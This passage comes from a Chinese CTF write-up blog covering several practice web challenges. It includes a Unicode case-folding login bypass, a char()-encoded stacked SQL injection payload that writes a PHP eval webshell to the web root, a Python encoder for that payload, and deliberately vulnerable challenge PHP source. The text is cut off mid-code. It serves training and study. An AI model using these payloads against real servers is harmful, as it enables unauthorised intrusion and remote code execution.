<p>处理逻辑如上,再注册之后会用<code>toUpperCase()</code>去将名称转换为大写，而这里就是这一题的突破口，可以通过JS的大小写特性绕过：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a><br><code>&quot;ı&quot;.toUpperCase() == &#39;I&#39;，&quot;ſ&quot;.toUpperCase() == &#39;S&#39;</code><br>因此用户名输入<code>ADMıN</code>即可成功注册，绕过第一道坎，这和unicode欺骗有点像其实<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674319268720-6c558d01-5c85-4a97-8a99-f138c919c5ea.png" alt="image.png">抓个包儿：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674319405202-c476fc05-238d-441e-933e-ac3a9c4cbd01.png" alt="image.png"><br>从源码中也可以看到有个原型链污染，也就是ejs了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674319444749-13fd8b02-7205-4b28-9d3d-2916e61e0d9f.png" alt="image.png"><br>直接反弹shell：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674319456843-8c2d73cf-a2ea-494b-a156-ee490e9a44ea.png" alt="image.png"></p>
<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>考点：数字型，过滤or的SQL堆叠注入<br>一开始我没想出来ban了or和and能干啥，我忘掉了<code>^、|、&amp;</code>这三个特殊字符，失策失策<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674396330333-73e18928-269b-4c0b-a3d4-41bfb61c1677.png" alt="image.png"><br>一开始有个登录注册，这里其实也有个注入点，存在的是二次注入，在登录的时候触发，而在查询界面也有个字符型sql注入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674396390314-8ac356b6-2235-4037-b4b2-7801621e7ed6.png" alt="image.png"><br>使用异或就可以进行一个盲注，这里也可以写脚本把user跑出来，database就不行（ban了）<br>既然是字符型，而且没过滤分号，那就大概率可堆叠注入，事实证明也是可以的，扫描出来一个目录<code>favicon</code>，但是里面啥也没有，估计就是只有这个文件夹有写入的权限，我们可以这样写shell：<br><code>?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,98,111,111,103,105,112,111,112,46,112,104,112,39);prepare boogipop from @sql;execute boogipop;-- -</code><br>上述sql可以用脚本写出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sql=<span class="string">&quot;select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/boogipop.php&#x27;&quot;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> sql:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i!=<span class="built_in">len</span>(sql):</span><br><span class="line">        word=<span class="built_in">str</span>(<span class="built_in">ord</span>(word))</span><br><span class="line">        res+=word+<span class="string">&quot;,&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        word=<span class="built_in">str</span>(<span class="built_in">ord</span>(word))</span><br><span class="line">        res+=word</span><br><span class="line">true_res=<span class="string">f&quot;char(<span class="subst">&#123;res&#125;</span>)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(true_res)</span><br></pre></td></tr></table></figure>
<p>然后直接去读flag即可</p>
<p>对于第二个注入点，没啥讲究，貌似没用，标题唬人用的<br>wp中是先用<code>load_file(&quot;hex of filename&quot;)</code>去读取源代码，发现用的是<code>mysqli_multi_query()</code>执行的，说明可以堆叠注入</p>
<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>考点:反序列化+SQL注入+代码审计<br>这题非常好玩儿~根据官方是说开局给了三个文件（buu没给）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span> = <span class="string">&quot;pic/&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = False;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;config.txt&quot;</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">            <span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">            <span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">            <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># Read some config html</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Show Images&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2 align=<span class="string">&quot;center&quot;</span>&gt;Your images&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;The <span class="function"><span class="keyword">function</span> <span class="title">of</span> <span class="title">viewing</span> <span class="title">the</span> <span class="title">image</span> <span class="title">has</span> <span class="title">not</span> <span class="title">been</span> <span class="title">completed</span>, <span class="title">and</span> <span class="title">currently</span> <span class="title">only</span> <span class="title">the</span> <span class="title">contents</span> <span class="title">of</span> <span class="title">your</span> <span class="title">image</span> <span class="title">name</span> <span class="title">can</span> <span class="title">be</span> <span class="title">saved</span>. <span class="title">I</span> <span class="title">hope</span> <span class="title">you</span> <span class="title">can</span> <span class="title">forgive</span> <span class="title">me</span> <span class="title">and</span> <span class="title">my</span> <span class="title">colleagues</span> <span class="title">and</span> <span class="title">I</span> <span class="title">are</span> <span class="title">working</span> <span class="title">hard</span> <span class="title">to</span> <span class="title">improve</span>.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="function">&lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">include</span>(<span class="params"><span class="string">&quot;./helper.php&quot;</span></span>)</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>] == <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">Delete_All_Images</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span>-&gt;<span class="title function_ invoke__">Get_All_Images</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$this</span>-&gt;con))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">                    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">                    <span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;show.php?delete_all=true&quot;</span>&gt;Delete All Images&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;upload.php&quot;</span>&gt;Upload Images&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Image Upload&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p align=<span class="string">&quot;center&quot;</span>&gt;&lt;img src=<span class="string">&quot;https://i.loli.net/2019/10/06/i5GVSYnB1mZRaFj.png&quot;</span> width=<span class="number">300</span> length=<span class="number">150</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;upload&quot;</span> action=<span class="string">&quot;&quot;</span>  method=<span class="string">&quot;post&quot;</span> enctype =<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;Submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;./show.php&quot;</span>&gt;You can view the pictures you uploaded here&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./helper.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload file failed.&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">upload_base</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span 